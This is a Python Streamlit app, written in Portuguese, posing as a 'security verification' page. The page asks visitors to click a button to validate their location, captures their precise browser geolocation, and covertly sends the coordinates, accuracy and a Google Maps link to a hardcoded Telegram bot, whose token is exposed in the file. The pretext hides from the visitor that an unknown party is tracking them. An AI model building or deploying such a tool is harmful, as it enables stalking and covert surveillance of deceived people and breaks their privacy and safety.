import streamlit as st
from streamlit_js_eval import get_geolocation
import requests

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Verificação de Local local", page_icon="📍")

# --- CREDENCIAIS (Proteja-as no st.secrets no futuro) ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
CHAT_ID = "8210828398"

def enviar_telegram(lat, lon, accuracy):
    """Envia os dados de forma segura via Python backend"""
    texto = (
        f"📍 **Nova Localização Recebida**\n"
        f"🌍 Lat: `{lat}`\n"
        f"🌍 Lon: `{lon}`\n"
        f"🎯 Precisão: `{accuracy}m`\n"
        f"🗺️ Mapa: https://www.google.com/maps?q={lat},{lon}"
    )
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": texto, "parse_mode": "Markdown"})
        return True
    except:
        return False

# --- INTERFACE ---
st.title("Verificação de Segurança")
st.write("Para prosseguir, precisamos validar sua localização atual.")

# CSS para o botão ficar parecido com o que você queria
st.markdown("""
    <style>
    div.stButton > button {
        width: 100%;
        height: 60px;
        background-color: #00ff7f;
        color: black;
        font-weight: bold;
        border-radius: 15px;
    }
    </style>
""", unsafe_allow_html=True)

# O componente que realmente ativa o pedido de localização do navegador
if st.button("📍 CLIQUE PARA VALIDAR LOCALIZAÇÃO"):
    loc = get_geolocation()
    
    if loc:
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        acc = loc['coords']['accuracy']
        
        st.success("Localização capturada com sucesso!")
        
        # Envia para o Telegram
        if enviar_telegram(lat, lon, acc):
            st.info("Relatório de segurança enviado para o servidor.")
        
        # Mostra um mapa simples na tela
        st.map({"lat": [lat], "lon": [lon]})
    else:
        st.warning("Aguardando permissão... Por favor, aceite o pedido de localização no seu navegador.")
        st.info("Dica: Se o seu GPS estiver desligado, o Android mostrará a tela de 'Precisão de Local'.")

